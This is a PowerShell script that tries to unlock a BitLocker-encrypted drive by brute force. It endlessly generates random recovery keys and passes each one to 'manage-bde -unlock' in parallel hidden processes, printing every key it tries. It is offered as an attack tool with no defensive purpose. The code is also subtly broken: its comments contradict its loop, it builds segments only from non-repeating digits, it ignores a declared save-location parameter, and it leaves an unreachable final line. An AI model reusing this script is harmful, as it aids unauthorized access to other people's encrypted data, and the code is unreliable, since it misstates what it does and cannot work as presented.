#Requires -Version 7.0

param (
    [Parameter(Mandatory=$true)]
    [string]$driveLetter,
    [Parameter(Mandatory=$true)]
    [string]$saveLocation,
    [Parameter(Mandatory=$true)]
    [int]$coreCount
)

# Function to generate a single BitLocker recovery key
function GenerateBitLockerKey {
    # Initialize an empty array to store the key segments
    $keySegments = @()

    # Loop to generate 6 segments of 8 digits each
    for ($i = 0; $i -lt 8; $i++) {
        # Generate a random 8-digit number
        $segment = -join ((0..9) | Get-Random -Count 6)
        
        # Add the segment to the key segments array
        $keySegments += $segment
    }

    # Combine the segments into a single string separated by hyphens
    $mockKey = $keySegments -join '-'
    return $mockKey
}

while ($true) {
    $bitKeys = @()
    for ($i = 0; $i -lt 10000; $i++) {
        $bitKeys += GenerateBitLockerKey
    }
    $bitKeys | ForEach-Object -Parallel {
        $recoveryKey = $_
        Start-Process -FilePath "manage-bde" -ArgumentList "-unlock $using:driveLetter -RecoveryPassword $recoveryKey" -WindowStyle Hidden
        Write-Host "$recoveryKey" -ForegroundColor Yellow
    } -ThrottleLimit $coreCount
}
Read-Host
